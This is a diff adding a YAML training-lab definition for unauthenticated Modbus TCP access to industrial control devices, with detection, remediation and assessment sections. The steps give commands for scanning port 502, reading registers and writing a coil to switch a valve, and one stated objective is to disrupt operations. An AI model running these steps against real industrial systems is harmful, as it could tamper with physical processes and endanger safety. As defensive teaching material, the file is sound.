@@ -1,0 +1,96 @@
+# Category: IoT/OT Security
+name: "Modbus Unauthenticated Read – Industrial Control Data Exposure"
+id: "scada-modbus-read-001"
+category: "ot_security"
+subcategory: "modbus"
+difficulty: "intermediate"
+estimated_time: "50 minutes"
+
+description: |
+  Access a Modbus TCP device (port 502) without authentication to read
+  coils, registers, and other data. This is common in legacy industrial
+  control systems (ICS) and can reveal process values and control states.
+
+learning_objectives:
+  - Understand Modbus protocol (function codes)
+  - Use modbus‑client tools to read registers
+  - Identify critical values (e.g., pressure, temperature, valve status)
+  - Potentially write to coils to disrupt operations
+
+tools:
+  - nmap (modbus‑discover script)
+  - pymodbus (Python)
+  - Modbus Poll (GUI)
+  - metasploit (auxiliary/scanner/scada/modbus)
+
+prerequisites:
+  - Modbus device reachable on port 502
+  - No authentication (default)
+
+steps:
+  - id: "step1"
+    phase: "discovery"
+    action: "Scan for Modbus devices"
+    commands:
+      - "nmap -p 502 --script modbus-discover <IP_RANGE>"
+    expected_output: "List of Modbus devices with unit IDs"
+    detection: "Nmap scan may be logged"
+
+  - id: "step2"
+    phase: "read_data"
+    action: "Read coils and holding registers"
+    commands:
+      - "# Using pymodbus"
+      - "client = ModbusTcpClient('192.168.1.10')"
+      - "client.read_holding_registers(0, 10, unit=1)"
+      - "# Or use modbus-cli"
+    expected_output: "Register values (e.g., 0x00FF)"
+    detection: "Modbus device may log connections"
+
+  - id: "step3"
+    phase: "write"
+    action: "Write to a coil (e.g., open/close valve)"
+    commands:
+      - "# Write coil 0 to 1"
+      - "client.write_coil(0, True, unit=1)"
+    expected_output: "Valve or actuator changes state"
+    detection: "Process alarms may trigger"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "NIST SP 800-82"
+    control: "5.4"
+    description: "ICS Network Security"
+
+detection:
+  network_indicators:
+    - "Traffic to port 502 from non‑OT network"
+  log_indicators:
+    - "Modbus device logs showing connections"
+  endpoint_indicators:
+    - "nmap, pymodbus scripts"
+
+remediation:
+  immediate:
+    - "Restrict Modbus traffic to trusted IPs using firewalls"
+    - "Use serial‑based Modbus (RTU) instead of TCP if possible"
+  long_term:
+    - "Implement industrial DMZ with deep packet inspection"
+    - "Use security gateways like Tofino"
+
+variables:
+  device_ip: "192.168.1.10"
+  unit_id: 1
+
+assessment_questions:
+  - "What are the common Modbus function codes?"
+  - "Why is Modbus TCP considered insecure?"
+  - "What is the difference between a coil and a holding register?"
+
+references:
+  - url: "https://www.modbus.org/"
+    title: "Modbus Specification"
+  - url: "https://www.cisa.gov/ics"
+    title: "CISA ICS Cybersecurity"
